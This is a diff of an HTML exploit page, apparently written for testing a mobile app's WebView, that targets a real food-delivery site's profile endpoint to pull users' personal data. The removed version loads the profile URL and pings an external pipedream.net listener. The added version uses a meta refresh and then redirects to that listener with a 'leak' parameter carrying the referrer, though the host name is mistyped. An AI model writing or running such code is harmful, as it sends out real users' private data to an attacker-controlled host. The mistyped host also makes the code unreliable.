@@ -1,23 +1,15 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit</title>
+    <meta http-equiv="refresh" content="0;url=https://www.zomato.com/webroutes/getPage?page_url=/profile">
 </head>
 <body>
     <script>
-        // We attempt to "load" the PII as if it were a script or an image.
-        // The Smali code says the app will intercept this request and 
-        // call loadUrl() on it.
-        const piiUrl = "https://www.zomato.com/webroutes/getPage?page_url=/profile";
-        
-        // This triggers shouldOverrideUrlLoading
-        window.location.href = piiUrl;
-
-        // Immediately try to "catch" the data if the app's internal 
-        // state allows a transition.
-        setTimeout(() => {
-            fetch('https://eomfuajl79ed6za.m.pipedream.net/?status=triggered');
-        }, 1000);
+        // After 2 seconds, the WebView should be showing the JSON.
+        // We then attempt to 'jump' it back to our listener.
+        setTimeout(function() {
+            window.location.href = "https://eomfuajl79ed6za.m.pipedream.ne/?leak=" + encodeURIComponent(document.referrer);
+        }, 2000);
     </script>
 </body>
 </html>
